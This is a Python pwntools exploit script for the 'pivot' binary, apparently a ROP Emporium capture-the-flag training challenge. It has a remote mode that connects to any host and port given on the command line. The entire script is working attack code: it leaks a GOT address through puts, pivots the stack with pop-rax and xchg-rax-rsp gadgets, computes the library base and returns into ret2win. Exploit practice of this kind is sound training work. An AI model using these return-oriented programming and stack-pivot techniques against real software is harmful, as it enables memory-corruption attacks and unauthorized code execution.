from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './pivot'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

foothold_offset = 0x96a
ret2win_offset = 0xa81

pop_rdi = 0x0000000000400a33

# Our stack pivot
pop_rax = 0x00000000004009bb
xchg_rax_rsp = 0x00000000004009bd

io = start()

io.recvuntil(' to pivot:')
pivot_addr = int(io.recvline().strip(), 16)

payload = flat(    # Need to call foothold_plt to populate GOT with function address
        elf.plt.foothold_function,
        pop_rdi,
        elf.got.foothold_function,
        elf.plt.puts,
        elf.symbols.main
)
io.sendline(payload)
# Our second payload to pivot to address we were given at beginning (where our payload 1 was injected)
payload2 = flat({
    40:[
        pop_rax,
        pivot_addr,
        xchg_rax_rsp
    ]
    })
# to pivot
io.sendline(payload2)
# gdb.attach(io, gdbscript='init-pwndbg')
io.recvuntil("libpivot\n")
foothold_addr = u64(io.recvline()[:6].ljust(8, b"\x00"))

libc_base = foothold_addr - foothold_offset
ret2win_addr = libc_base + ret2win_offset

payload3 = flat({
    40:[
        ret2win_addr
    ]
    })
io.sendline(payload3)
io.recvuntil('smash\n> Thank you!\n')
print(io.recvline())